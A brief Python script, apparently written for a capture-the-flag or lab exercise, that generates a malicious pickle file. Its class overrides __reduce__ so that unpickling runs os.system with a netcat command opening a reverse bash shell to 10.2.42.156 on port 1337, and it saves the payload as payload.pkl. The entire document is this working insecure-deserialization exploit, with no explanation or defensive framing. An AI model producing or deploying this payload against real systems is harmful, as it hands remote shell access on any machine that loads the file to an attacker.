#!/usr/bin/python3
# Author: Hack.You
import os
import pickle

class Shell(object):
    def __reduce__(self):
        cmd = 'busybox nc 10.2.42.156 1337 -e /bin/bash'
        return (os.system, (cmd,))

pickledData = pickle.dumps(Shell())
with open('payload.pkl', 'wb') as f:
    f.write(pickledData)
